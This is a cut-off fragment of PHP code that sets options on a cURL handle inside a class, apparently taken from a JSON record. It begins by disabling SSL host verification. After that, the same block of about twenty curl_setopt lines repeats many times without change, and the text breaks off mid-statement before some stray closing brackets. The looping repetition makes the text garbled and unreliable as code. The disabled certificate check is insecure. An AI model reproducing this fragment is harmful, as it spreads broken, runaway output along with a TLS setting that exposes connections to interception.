CURLOPT_SSL_VERIFYHOST, false);\n        curl_setopt($this->curl_handle, CURLOPT_FOLLOWLOCATION, true);\n        curl_setopt($this->curl_handle, CURLOPT_MAXREDIRS, 10);\n        curl_setopt($this->curl_handle, CURLOPT_TIMEOUT, 30);\n        curl_setopt($this->curl_handle, CURLOPT_CONNECTTIMEOUT, 30);\n        curl_setopt($this->curl_handle, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);\n        curl_setopt($this->curl_handle, CURLOPT_ENCODING, '');\n        curl_setopt($this->curl_handle, CURLOPT_DNS_CACHE_TIMEOUT, 120);\n        curl_setopt($this->curl_handle, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);\n        curl_setopt($this->curl_handle, CURLOPT_NOPROGRESS, true);\n        curl_setopt($this->curl_handle, CURLOPT_VERBOSE, $this->debug_mode);\n        curl_setopt($this->curl_handle, CURLOPT_HEADERFUNCTION, array($this, 'header_callback'));\n        curl_setopt($this->curl_handle, CURLOPT_WRITEFUNCTION, array($this, 'body_callback'));\n        curl_setopt($this->curl_handle, CURLOPT_READFUNCTION, array($this, 'read_callback'));\n        curl_setopt($this->curl_handle, CURLOPT_SEEKFUNCTION, array($this, 'seek_callback'));\n        curl_setopt($this->curl_handle, CURLOPT_PROGRESSFUNCTION, array($this, 'progress_callback'));\n        curl_setopt($this->curl_handle, CURLOPT_PROGRESSDATA, $this);\n        curl_setopt($this->curl_handle, CURLOPT_HEADER, true);\n        curl_setopt($this->curl_handle, CURLOPT_RETURNTRANSFER, true);\n        curl_setopt($this->curl_handle, CURLOPT_FOLLOWLOCATION, true);\n        curl_setopt($this->curl_handle, CURLOPT_MAXREDIRS, 10);\n        curl_setopt($this->curl_handle, CURLOPT_TIMEOUT, 30);\n        curl_setopt($this->curl_handle, CURLOPT_CONNECTTIMEOUT, 30);\n        curl_setopt($this->curl_handle, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);\n        curl_setopt($this->curl_handle, CURLOPT_ENCODING, '');\n        curl_setopt($this->curl_handle, CURLOPT_DNS_CACHE_TIMEOUT, 120);\n        curl_setopt($this->curl_handle, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);\n        curl_setopt($this->curl_handle, CURLOPT_NOPROGRESS, true);\n        curl_setopt($this->curl_handle, CURLOPT_VERBOSE, $this->debug_mode);\n        curl_setopt($this->curl_handle, CURLOPT_HEADERFUNCTION, array($this, 'header_callback'));\n        curl_setopt($this->curl_handle, CURLOPT_WRITEFUNCTION, array($this, 'body_callback'));\n        curl_setopt($this->curl_handle, CURLOPT_READFUNCTION, array($this, 'read_callback'));\n        curl_setopt($this->curl_handle, CURLOPT_SEEKFUNCTION, array($this, 'seek_callback'));\n        curl_setopt($this->curl_handle, CURLOPT_PROGRESSFUNCTION, array($this, 'progress_callback'));\n        curl_setopt($this->curl_handle, CURLOPT_PROGRESSDATA, $this);\n        curl_setopt($this->curl_handle, CURLOPT_HEADER, true);\n        curl_setopt($this->curl_handle, CURLOPT_RETURNTRANSFER, true);\n        curl_setopt($this->curl_handle, CURLOPT_FOLLOWLOCATION, true);\n        curl_setopt($this->curl_handle, CURLOPT_MAXREDIRS, 10);\n        curl_setopt($this->curl_handle, CURLOPT_TIMEOUT, 30);\n        curl_setopt($this->curl_handle, CURLOPT_CONNECTTIMEOUT, 30);\n        curl_setopt($this->curl_handle, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);\n        curl_setopt($this->curl_handle, CURLOPT_ENCODING, '');\n        curl_setopt($this->curl_handle, CURLOPT_DNS_CACHE_TIMEOUT, 120);\n        curl_setopt($this->curl_handle, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);\n        curl_setopt($this->curl_handle, CURLOPT_NOPROGRESS, true);\n        curl_setopt($this->curl_handle, CURLOPT_VERBOSE, $this->debug_mode);\n        curl_setopt($this->curl_handle, CURLOPT_HEADERFUNCTION, array($this, 'header_callback'));\n        curl_setopt($this->curl_handle, CURLOPT_WRITEFUNCTION, array($this, 'body_callback'));\n        curl_setopt($this->curl_handle, CURLOPT_READFUNCTION, array($this, 'read_callback'));\n        curl_setopt($this->curl_handle, CURLOPT_SEEKFUNCTION, array($this, 'seek_callback'));\n        curl_setopt($this->curl_handle, CURLOPT_PROGRESSFUNCTION, array($this, 'progress_callback'));\n        curl_setopt($this->curl_handle, CURLOPT_PROGRESSDATA, $this);\n        curl_setopt($this->curl_handle, CURLOPT_HEADER, true);\n        curl_setopt($this->curl_handle, CURLOPT_RETURNTRANSFER, true);\n        curl_setopt($this->curl_handle, CURLOPT_FOLLOWLOCATION, true);\n        curl_setopt($this->curl_handle, CURLOPT_MAXREDIRS, 10);\n        curl_setopt($this->curl_handle, CURLOPT_TIMEOUT, 30);\n        curl_setopt($this->curl_handle, CURLOPT_CONNECTTIMEOUT, 30);\n        curl_setopt($this->curl_handle, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);\n        curl_setopt($this->curl_handle, CURLOPT_ENCODING, '');\n        curl_setopt($this->curl_handle, CURLOPT_DNS_CACHE_TIMEOUT, 120);\n        curl_setopt($this->curl_handle, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);\n        curl_setopt($this->curl_handle, CURLOPT_NOPROGRESS, true);\n        curl_setopt($this->curl_handle, CURLOPT_VERBOSE, $this->debug_mode);\n        curl_setopt($this->curl_handle, CURLOPT_HEADERFUNCTION, array($this, 'header_callback'));\n        curl_setopt($this->curl_handle, CURLOPT_WRITEFUNCTION, array($this, 'body_callback'));\n        curl_setopt($this->curl_handle, CURLOPT_READFUNCTION, array($this, 'read_callback'));\n        curl_setopt($this->curl_handle, CURLOPT_SEEKFUNCTION, array($this, 'seek_callback'));\n        curl_setopt($this->curl_handle, CURLOPT_PROGRESSFUNCTION, array($this, 'progress_callback'));\n        curl_setopt($this->curl_handle, CURLOPT_PROGRESSDATA, $this);\n        curl_setopt($this->curl_handle, CURLOPT_HEADER, true);\n        curl_setopt($this->curl_handle, CURLOPT_RETURNTRANSFER, true);\n        curl_setopt($this->curl_handle, CURLOPT_FOLLOWLOCATION, true);\n        curl_setopt($this->curl_handle, CURLOPT_MAXREDIRS, 10);\n        curl_setopt($this->curl_handle, CURLOPT_TIMEOUT, 30);\n        curl_setopt($this->curl_handle, CURLOPT_CONNECTTIMEOUT, 30);\n        curl_setopt($this->curl_handle, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);\n        curl_setopt($this->curl_handle, CURLOPT_ENCODING, '');\n        curl_setopt($this->curl_handle, CURLOPT_DNS_CACHE_TIMEOUT, 120);\n        curl_setopt($this->curl_handle, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);\n        curl_setopt($this->curl_handle, CURLOPT_NOPROGRESS, true);\n        curl_setopt($this->curl_handle, CURLOPT_VERBOSE, $this->debug_mode);\n        curl_setopt($this->curl_handle, CURLOPT_HEADERFUNCTION, array($this, 'header_callback'));\n        curl_setopt($this->curl_handle, CURLOPT_WRITEFUNCTION, array($this, 'body_callback'));\n        curl_setopt($this->curl_handle, CURLOPT_READFUNCTION, array($this, 'read_callback'));\n        curl_setopt($this->curl_handle, CURLOPT_SEEKFUNCTION, array($this, 'seek_callback'));\n        curl_setopt($this->curl_handle, CURLOPT_PROGRESSFUNCTION, array($this, 'progress_callback'));\n        curl_setopt($this->curl_handle, CURLOPT_PROGRESSDATA, $this);\n        curl_setopt($this->curl_handle, CURLOPT_HEADER, true);\n        curl_setopt($this->curl_handle, CURLOPT_RETURNTRANSFER, true);\n        curl_setopt($this->curl_handle, CURLOPT_FOLLOWLOCATION, true);\n        curl_setopt($this->curl_handle, CURLOPT_MAXREDIRS, 10);\n        curl_setopt($this->curl_handle, CURLOPT_TIMEOUT, 30);\n        curl_setopt($this->curl_handle, CURLOPT_CONNECTTIMEOUT, 30);\n        curl_setopt($this->curl_handle, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);\n        curl_setopt($this->curl_handle, CURLOPT_ENCODING, '');\n        curl_setopt($this->curl_handle, CURLOPT_DNS_CACHE_TIMEOUT, 120);\n        curl_setopt($this->curl_handle, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);\n        curl_setopt($this->curl_handle, CURLOPT_NOPROGRESS, true);\n        curl_setopt($this->curl_handle, CURLOPT_VERBOSE, $this->debug_mode);\n        curl_setopt($this->curl_handle, CURLOPT_HEADERFUNCTION, array($this, 'header_callback'));\n        curl_setopt($this->curl_handle, CURLOPT_WRITEFUNCTION, array($this, 'body_callback'));\n        curl_setopt($this->curl_handle, CURLOPT_READFUNCTION, array($this, 'read_callback'));\n        curl_setopt($this->curl_handle, CURLOPT_SEEKFUNCTION, array($this, 'seek_callback'));\n        curl_setopt($this->curl_handle, CURLOPT_PROGRESSFUNCTION, array($this, 'progress_callback'));\n        curl_setopt($this->curl_handle, CURLOPT_PROGRESSDATA, $this);\n        curl_setopt($this->curl_handle, CURLOPT_HEADER, true);\n        curl_setopt($this->curl_handle, CURLOPT_RETURNTRANSFER, true);\n        curl_setopt($this->curl_handle, CURLOPT_FOLLOWLOCATION, true);\n        curl_setopt($this->curl_handle, CURLOPT_MAXREDIRS, 10);\n        curl_setopt($this->curl_handle, CURLOPT_TIMEOUT, 30);\n        curl_setopt($this->curl_handle, CURLOPT_CONNECTTIMEOUT, 30);\n        curl_setopt($this->curl_handle, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);\n        curl_setopt($this->curl_handle, CURLOPT_ENCODING, '');\n        curl_setopt($this->curl_handle, CURLOPT_DNS_CACHE_TIMEOUT, 120);\n        curl_setopt($this->curl_handle, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);\n        curl_setopt($this->curl_handle, CURLOPT_NOPROGRESS, true);\n        curl_setopt($this->curl_handle, CURLOPT_VERBOSE, $this->debug_mode);\n        curl_setopt($this->curl_handle, CURLOPT_HEADERFUNCTION, array($this, 'header_callback'));\n        curl_setopt($this->curl_handle, CURLOPT_WRITEFUNCTION, array($this, 'body_callback'));\n        curl_setopt($this->curl_handle, CURLOPT_READFUNCTION, array($this, 'read_callback'));\n        curl_setopt($this->curl_handle, CURLOPT_SEEKFUNCTION, array($this, 'seek_callback'));\n        curl_setopt($this->curl_handle, CURLOPT_PROGRESSFUNCTION, array($this, 'progress_callback'));\n        curl_setopt($this->curl_handle, CURLOPT_PROGRESSDATA, $this);\n        curl_setopt($this->curl_handle, CURLOPT_HEADER, true);\n        curl_setopt($this->curl_handle, CURLOPT_RETURNTRANSFER, true);\n        curl_setopt($this->curl_handle, CURLOPT_FOLLOWLOCATION, true);\n        curl_setopt($this->curl_handle, CURLOPT_MAXREDIRS, 10);\n        curl_setopt($this->curl_handle, CURLOPT_TIMEOUT, 30);\n        curl_setopt($this->curl_handle, CURLOPT_CONNECTTIMEOUT, 30);\n        curl_setopt($this->curl_handle, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);\n        curl_setopt($this->curl_handle, CURLOPT_ENCODING, '');\n        curl_setopt($this->curl_handle, CURLOPT_DNS_CACHE_TIMEOUT, 120);\n        curl_setopt($this->curl_handle, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);\n        curl_setopt($this->curl_handle, CURLOPT_NOPROGRESS, true);\n        curl_setopt($this->curl_handle, CURLOPT_VERBOSE, $this->debug_mode);\n        curl_setopt($this->curl_handle, CURLOPT_HEADERFUNCTION, array($this, 'header_callback'));\n        curl_setopt($this->curl_handle, CURLOPT_WRITEFUNCTION, array($this, 'body_callback'));\n        curl_setopt($this->curl_handle, CURLOPT_READFUNCTION, array($this, 'read_callback'));\n        curl_setopt($this->curl_handle, CURLOPT_SEEKFUNCTION, array($this, 'seek_callback'));\n        curl_setopt($this->curl_handle, CURLOPT_PROGRESSFUNCTION, array($this, 'progress_callback'));\n        curl_setopt($this->curl_handle, CURLOPT_PROGRESSDATA, $this);\n        curl_setopt($this->curl_handle, CURLOPT_HEADER, true);\n        curl_setopt($this->curl_handle, CURLOPT_RETURNTRANSFER, true);\n        curl_setopt($this->curl_handle, CURLOPT_FOLLOWLOCATION, true);\n        curl_setopt($this->curl_handle"
  }
]